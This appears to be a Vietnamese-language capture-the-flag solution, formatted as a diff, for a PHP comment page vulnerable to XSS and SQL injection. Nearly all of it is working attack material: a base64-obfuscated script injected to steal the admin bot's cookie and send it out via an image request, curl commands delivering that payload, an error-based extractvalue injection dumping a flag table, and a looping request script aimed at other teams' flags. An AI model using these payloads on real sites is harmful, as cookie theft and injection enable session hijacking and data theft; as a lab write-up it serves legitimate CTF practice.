@@ -1,0 +1,50 @@
+
+# Mô tả
+
+Trang index có chức năng insert dữ liệu vào database, và hiển thị ra dữ liệu input. Cung cấp source trang index.php và db.sql
+
+Trang index.php, bị xss tại dòng 21. Và bị sql injection tại 18,19 câu lệnh insert. 
+
+Xây dựng payload gửi cho bot để bot insert cookie vào database. Dùng sql injection loại error base để lấy dữ liệu từ bảng flag.
+
+===============
+
+# Bước 1, xss
+
+i=new Image();i.src='http://127.0.0.1/web3/?feature=flag&comment='+btoa(document.cookie)
+
+# base64 encode payload
+aT1uZXcgSW1hZ2UoKTtpLnNyYz0naHR0cDovLzEyNy4wLjAuMS93ZWIzLz9mZWF0dXJlPWZsYWcmY29tbWVudD0nK2J0b2EoZG9jdW1lbnQuY29va2llKQ==
+
+# send to bot
+?feature=comments&comment=<script>eval(atob("aT1uZXcgSW1hZ2UoKTtpLnNyYz0naHR0cDovLzEyNy4wLjAuMS93ZWIzLz9mZWF0dXJlPWZsYWcmY29tbWVudD0nK2J0b2EoZG9jdW1lbnQuY29va2llKQ=="))</script>
+
+# Bước 2, sql injection errorbase
+?feature=comments&comment=123%27%20and%20extractvalue(0x0a,concat(0x0a,(select%20content%20from%20flag)))%20and%20%271
+
+# Script auto 
+
+curl --url "http://127.0.0.1/web3/admin.php" --data "url=http://10.0.0.11/?feature=comments&comment=<script>eval(atob("aT1uZXcgSW1hZ2UoKTtpLnNyYz0naHR0cDovLzEyNy4wLjAuMS93ZWIzLz9mZWF0dXJlPWZsYWcmY29tbWVudD0nK2J0b2EoZG9jdW1lbnQuY29va2llKQ=="))</script>"
+
+curl --url "http://127.0.0.1/web3/?feature=comments&comment=123%27%20and%20extractvalue(0x0a,concat(0x0a,(select%20content%20from%20flag)))%20and%20%271"
+
+# Cách 2: race condition
+
+while true; do curl --url "http://127.0.0.1/web3/?feature=comments&comment=123%27%20and%20extractvalue(0x0a,concat(0x0a,(select%20content%20from%20flag)))%20and%20%271"; done;
+
+
+Chờ lấy flag của đội khác
+
+====
+
+
+Hướng dẫn cấu hình server
+
+Change flag, domain in bot.js
+
+
+====
+
+
+
+
